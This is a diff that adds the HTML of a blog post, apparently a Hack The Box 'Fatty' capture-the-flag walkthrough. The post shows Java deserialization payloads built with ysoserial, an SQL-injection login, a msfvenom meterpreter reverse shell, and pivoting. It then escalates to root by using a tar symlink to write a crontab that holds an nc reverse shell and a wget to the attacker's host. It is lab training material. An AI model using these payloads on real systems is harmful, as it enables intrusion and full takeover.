+        ObjectInputStream oIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span>bIn<span style="color:#f92672">);</span>
+        User var8 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>User<span style="color:#f92672">)</span>oIn<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+      <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception var9<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        var9<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+        response <span style="color:#f92672">=</span> response <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Error: Failure while recovering the User object.&#34;</span><span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">return</span> response<span style="color:#f92672">;</span>
+      <span style="color:#f92672">}</span>
+
+      response <span style="color:#f92672">=</span> response <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Info: Your call was successful, but the method is not fully implemented yet.&#34;</span><span style="color:#f92672">;</span>
+      <span style="color:#66d9ef">return</span> response<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+  <span style="color:#f92672">}</span>
+</code></pre></div><ol start="9">
+<li>The same method is not implemented on client and we need to do that ourself. Prepare payloads using <a href="https://github.com/frohoff/ysoserial">yoserial</a> tool:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">$ java <span style="color:#f92672">-</span>jar ysoserial<span style="color:#f92672">-</span>master<span style="color:#f92672">-</span>SNAPSHOT<span style="color:#f92672">.</span><span style="color:#a6e22e">jar</span> CommonsCollections5 <span style="color:#960050;background-color:#1e0010">&#39;</span>wget http<span style="color:#f92672">:</span><span style="color:#75715e">//10.10.14.51/rshell&#39; | base64 -w 0
+</span><span style="color:#75715e"></span>$ java <span style="color:#f92672">-</span>jar ysoserial<span style="color:#f92672">-</span>master<span style="color:#f92672">-</span>SNAPSHOT<span style="color:#f92672">.</span><span style="color:#a6e22e">jar</span> CommonsCollections5 <span style="color:#960050;background-color:#1e0010">&#39;</span>chmod <span style="color:#f92672">+</span>x <span style="color:#f92672">./</span>rshell<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w 0
+$ java <span style="color:#f92672">-</span>jar ysoserial<span style="color:#f92672">-</span>master<span style="color:#f92672">-</span>SNAPSHOT<span style="color:#f92672">.</span><span style="color:#a6e22e">jar</span> CommonsCollections5 <span style="color:#960050;background-color:#1e0010">&#39;</span>nohup <span style="color:#f92672">./</span>rshell <span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w 0
+</code></pre></div><ol start="10">
+<li>Update Java client with generated payloads in order:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">changePW</span><span style="color:#f92672">(</span>String username<span style="color:#f92672">,</span> String newPassword<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> MessageParseException<span style="color:#f92672">,</span> MessageBuildException<span style="color:#f92672">,</span> IOException <span style="color:#f92672">{</span>
+
+    String<span style="color:#f92672">[]</span> payloads <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[</span>3<span style="color:#f92672">];</span>
+    payloads<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rO0ABXNyAC5qYXZh...AAAAAAAAAdwgAAAAQAAAAAHh4&#34;</span><span style="color:#f92672">;</span>
+    payloads<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rO0ABXNyAC5qYXZ...AAAAAAAAB3CAAAABAAAAAAeHg=&#34;</span><span style="color:#f92672">;</span>
+    payloads<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rO0ABXNyAC5qYXZ...9AAAAAAAAAdwgAAAAQAAAAAHh4&#34;</span><span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>String s<span style="color:#f92672">:</span> payloads<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+      <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">action</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ActionMessage<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sessionID</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;changePW&#34;</span><span style="color:#f92672">);</span>
+      <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">action</span><span style="color:#f92672">.</span><span style="color:#a6e22e">addArgument</span><span style="color:#f92672">(</span>s<span style="color:#f92672">);</span>
+      sendAndRecv<span style="color:#f92672">();</span>
+    <span style="color:#f92672">}</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hasError</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Error: Your action caused an error on the application server!&#34;</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getContentAsString</span><span style="color:#f92672">();</span>
+  <span style="color:#f92672">}</span>
+</code></pre></div><h1 id="foothold">Foothold</h1>
+<ol>
+<li>Java client has SQLi that allows to login with admin privileges using these credentials:</li>
+</ol>
+<pre><code>username: qtc' UNION SELECT id, username, email, password, 'admin' FROM users ORDER BY role ASC LIMIT 1#
+password: clarabibi
+</code></pre><ol start="2">
+<li>Generate payload:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.51 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f elf -o rshell
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: <span style="color:#ae81ff">130</span> bytes
+Final size of elf file: <span style="color:#ae81ff">250</span> bytes
+Saved as: rshell
+</code></pre></div><ol start="3">
+<li>
+<p>Start <code>multi/handler</code> listener.</p>
+</li>
+<li>
+<p>Start Python web server to deliver <code>rshell</code> to the box.</p>
+</li>
+<li>
+<p>Trigger password change event in Java GUI and meterpreter session will open:</p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.51:4444
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">3021284</span> bytes<span style="color:#f92672">)</span> to 10.10.10.174
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.51:4444 -&gt; 10.10.10.174:37982<span style="color:#f92672">)</span> at 2020-02-10 23:04:41 +0000
+
+meterpreter &gt; ifconfig
+
+Interface  1
+<span style="color:#f92672">============</span>
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : <span style="color:#ae81ff">65536</span>
+Flags        : UP,LOOPBACK
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+
+
+Interface 11
+<span style="color:#f92672">============</span>
+Name         : eth0
+Hardware MAC : 02:42:ac:1c:00:05
+MTU          : <span style="color:#ae81ff">1500</span>
+Flags        : UP,BROADCAST,MULTICAST
+IPv4 Address : 172.28.0.5
+IPv4 Netmask : 255.255.0.0
+
+meterpreter &gt;
+</code></pre></div><ol start="6">
+<li>Setup route for pivoting:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; route add 172.28.0.5 255.255.255.255 <span style="color:#ae81ff">1</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Route added
+msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; route add 172.28.0.1 255.255.255.255 <span style="color:#ae81ff">1</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Route added
+</code></pre></div><ol start="7">
+<li>Start <code>auxiliary/server/socks4a</code>, inject custom key to <code>authorized_keys</code> and SSH into the box:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">proxychains ssh -i fatty qtc@172.28.0.5
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.14
+<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  127.0.0.1:1080  ...  172.28.0.5:22  ...  OK
+The authenticity of host <span style="color:#e6db74">&#39;172.28.0.5 (172.28.0.5)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:NHsveCKmHmSUEgbE9Im/ZbTOTNE3xjsZr6Owadb4QmA.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>172.28.0.5<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span> to the list of known hosts.
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See &lt;http://wiki.alpinelinux.org/&gt;.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+55e9ce5d0b6b:~$
+</code></pre></div><h1 id="getting-user-flag">Getting user flag</h1>
+<ol>
+<li>By default it has 0-permissions:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">55e9ce5d0b6b:~$ ls -al
+total <span style="color:#ae81ff">24</span>
+drwxr-sr-x    <span style="color:#ae81ff">1</span> qtc      qtc           <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 23:10 .
+drwxr-xr-x    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">30</span> 11:11 ..
+-rw-------    <span style="color:#ae81ff">1</span> qtc      qtc              <span style="color:#ae81ff">8</span> Feb <span style="color:#ae81ff">10</span> 23:10 .ash_history
+drwx------    <span style="color:#ae81ff">1</span> qtc      qtc           <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">30</span> 11:11 .ssh
+-rwxr-xr-x    <span style="color:#ae81ff">1</span> qtc      qtc            <span style="color:#ae81ff">250</span> Feb <span style="color:#ae81ff">10</span> 23:05 rshell
+----------    <span style="color:#ae81ff">1</span> qtc      qtc             <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">30</span> 11:10 user.txt
+55e9ce5d0b6b:~$
+</code></pre></div><ol start="2">
+<li>Change to read, read the flag, and change back (just in case ;):</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">55e9ce5d0b6b:~$ chmod +r user.txt; cat user.txt; chmod -r user.txt
+7fab2c31fc7173a86872db45ae922073
+55e9ce5d0b6b:~$
+</code></pre></div><h1 id="further-enumeration">Further enumeration</h1>
+<ol>
+<li>On this version of Linux only <code>pspy32s</code> worked:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">2020/02/10 23:14:02 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> PID<span style="color:#f92672">=</span><span style="color:#ae81ff">339</span>    | ash -c scp -f /opt/fatty/tar/logs.tar
+2020/02/10 23:14:02 FS:               ACCESS | /usr/bin/scp
+2020/02/10 23:14:02 FS:               ACCESS | /usr/bin/scp
+2020/02/10 23:14:02 FS:               ACCESS | /usr/bin/scp
+2020/02/10 23:14:02 FS:                 OPEN | /etc/passwd
+2020/02/10 23:14:02 FS:               ACCESS | /etc/passwd
+2020/02/10 23:14:02 FS:               ACCESS | /etc/passwd
+2020/02/10 23:14:02 FS:        CLOSE_NOWRITE | /etc/passwd
+2020/02/10 23:14:02 FS:                 OPEN | /opt/fatty/tar/logs.tar
+2020/02/10 23:14:02 FS:               ACCESS | /opt/fatty/tar/logs.tar
+2020/02/10 23:14:02 FS:        CLOSE_NOWRITE | /opt/fatty/tar/logs.tar
+2020/02/10 23:14:02 FS:        CLOSE_NOWRITE | /usr/bin/scp
+2020/02/10 23:14:02 FS:        CLOSE_NOWRITE | /usr/sbin/sshd
+</code></pre></div><ol start="2">
+<li>So something is getting tar file from location where we have right to write. Let&rsquo;s try to inject some payload in it using <a href="https://sintonen.fi/advisories/tar-extract-pathname-bypass.txt">this</a> technique:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tar cf test.tar -P <span style="color:#e6db74">&#39;opt/fatty/logs/../root/.ssh/authorized_keys&#39;</span>
+
+$ tar tvf test.tar
+tar: Removing leading <span style="color:#e6db74">`</span>opt/fatty/logs/../<span style="color:#960050;background-color:#1e0010">&#39;</span> from member names
+-rw-r----- root/root <span style="color:#ae81ff">563</span> 2020-02-11 01:23 opt/fatty/logs/../root/.ssh/authorized_keys
+</code></pre></div><ol start="3">
+<li>
+<p>Upload that file on the box and replace <code>/opt/fatty/tar/logs.tar</code> with it</p>
+</li>
+<li>
+<p>Few tries:</p>
+</li>
+</ol>
+<ul>
+<li>Failed #1:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo find opt/
+opt/
+opt/fatty
+opt/fatty/home
+opt/fatty/home/qtc
+opt/fatty/home/qtc/.ssh
+opt/fatty/home/qtc/.ssh/authorized_keys
+opt/fatty/logs
+opt/fatty/root
+opt/fatty/root/.ssh
+opt/fatty/root/.ssh/authorized_keys
+
+$ sudo tar cf test.tar --numeric-owner -P <span style="color:#e6db74">&#39;opt/fatty/logs/../root/.ssh/authorized_keys&#39;</span> <span style="color:#e6db74">&#39;opt/fatty/logs/../home/qtc/.ssh/authorized_keys&#39;</span>
+</code></pre></div><ul>
+<li>Failed #2:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo tar cf test.tar --numeric-owner -P opt/fatty/logs opt/fatty/logs/../../../home/qtc/.ssh/authorized_keys opt/fatty/logs/../../../root/.ssh/authorized_keys
+$ tar tvf test.tar
+drwxr-x--- 1000/1000         <span style="color:#ae81ff">0</span> 2020-02-11 01:54 opt/fatty/logs/
+-rw-r----- 1000/1000         <span style="color:#ae81ff">0</span> 2020-02-11 01:53 opt/fatty/logs/error-log.txt
+-rw-r----- 1000/1000         <span style="color:#ae81ff">0</span> 2020-02-11 01:54 opt/fatty/logs/info-log.txt
+tar: Removing leading <span style="color:#e6db74">`</span>opt/fatty/logs/../../../<span style="color:#960050;background-color:#1e0010">&#39;</span> from member names
+-rw-r----- 1000/1000       <span style="color:#ae81ff">563</span> 2020-02-11 01:23 opt/fatty/logs/../../../home/qtc/.ssh/authorized_keys
+-rw-r----- 0/0             <span style="color:#ae81ff">563</span> 2020-02-11 01:23 opt/fatty/logs/../../../root/.ssh/authorized_keys
+</code></pre></div><ul>
+<li>Failed #3:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo tar cf test.tar --numeric-owner -P opt/fatty/logs/error-log.txt/../root/.ssh/authorized_keys opt/fatty/logs/info-log.txt/../home/qtc/.ssh/authorized_keys
+</code></pre></div><h1 id="getting-root">Getting root</h1>
+<ol>
+<li>Another approach:</li>
+</ol>
+<ul>
+<li>symlinked file logs.tar to /etc/crontab. tar it and let it grab</li>
+<li>Replaced logs.tar with symlink to crafted crontab</li>
+</ul>
+<ol start="2">
+<li>Preparing:</li>
+</ol>
+<ul>
+<li>Create tar file with just symlink pointer:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tar tvf logs1.tar
+lrwxrwxrwx root/root   <span style="color:#ae81ff">0</span> 2020-02-12 18:07 logs.tar -&gt; /etc/crontab
+</code></pre></div><ul>
+<li>Have plain-text contained only crontab entries:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat logs2.tar                                                                                          
+<span style="color:#75715e"># /etc/crontab: system-wide crontab</span>                                                                                  
+<span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>   
+<span style="color:#75715e"># command to install the new version when you edit this file</span>         
+<span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>   
+<span style="color:#75715e"># that none of the other crontabs do.</span>                                                                                
+
+SHELL<span style="color:#f92672">=</span>/bin/sh                                                                                                        
+PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+<span style="color:#75715e"># m h dom mon dow user  command</span>                                                                                      
+<span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+<span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+<span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
+<span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+#                                                                                                                    
+*  *    * * *   root    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.51 <span style="color:#ae81ff">6666</span> &gt;/tmp/f
+*  *    * * *   root    ping -c <span style="color:#ae81ff">100</span> 10.10.14.51                                                                      
+*  *    * * *   root    wget http://10.10.14.51/boobar
+</code></pre></div><ol start="3">
+<li>Create a listener on port 6666 with <code>-k</code> switch to avoid disconnection during repeating connection:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -lnvkp <span style="color:#ae81ff">6666</span>
+</code></pre></div><ol start="4">
+<li>
+<p>Upload both <code>logs1.tar</code> and <code>logs2.tar</code> files on the docker.</p>
+</li>
+<li>
+<p>Replace <code>/opt/fatty/tar/logs.tar</code> with <code>logs1.tar</code> and watch with <code>pspy32s -f</code> it reads and closes <code>/opt/fatty/tar/logs.tar</code></p>
+</li>
+<li>
+<p>Replace <code>/opt/fatty/tar/logs.tar</code> with <code>logs2.tar</code> and watch with <code>pspy32s -f</code> it reads and closes <code>/opt/fatty/tar/logs.tar</code></p>
+</li>
+<li>
+<p>Reverse shell should come up in a couple of minutes:</p>
+</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lnvk <span style="color:#ae81ff">6666</span>
+Ncat: Version 7.80 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+Ncat: Listening on :::6666
+Ncat: Listening on 0.0.0.0:6666
+Ncat: Connection from 10.10.10.174.
+Ncat: Connection from 10.10.10.174:56052.
+/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+cd /root
+cat root.txt
+ee982fa19b413415391ed4a17b2bd9c7
+</code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="http://foxmaccloud.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/FoxMaccloud">Fox Maccloud</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
